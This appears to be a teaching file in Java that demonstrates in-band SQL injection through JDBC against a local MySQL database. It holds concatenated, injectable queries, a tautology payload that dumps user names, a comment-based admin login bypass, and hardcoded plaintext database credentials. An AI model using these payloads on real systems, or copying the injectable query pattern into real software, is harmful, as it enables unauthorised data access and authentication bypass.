// In-Band SQL Injection via JDBC
// Attacker retrieves data directly in the same channel used to send the query.

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

public class inband_injection {
    public static void main(String[] args) throws Exception {
        String url = "jdbc:mysql://localhost:3306/database_name";
        String username = "rootgfg";
        String password = "gfg123";

        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection con = DriverManager.getConnection(url, username, password);
        Statement st = con.createStatement();

        // VULNERABLE: attacker input concatenated directly into the query
        String input = "1' OR '1'='1";
        String query = "SELECT id, name FROM users WHERE role = '" + input + "'";

        ResultSet rs = st.executeQuery(query);
        while (rs.next()) {
            System.out.println("User found: " + rs.getString("name"));
        }

        // Classic in-band login bypass
        String login = "admin' -- ";
        String loginQuery = "SELECT * FROM users WHERE username = '" + login + "' AND password = 'x'";
        ResultSet lrs = st.executeQuery(loginQuery);
        System.out.println(lrs.next() ? "Logged in as admin (bypassed)" : "Login denied");

        rs.close();
        lrs.close();
        st.close();
        con.close();
    }
}
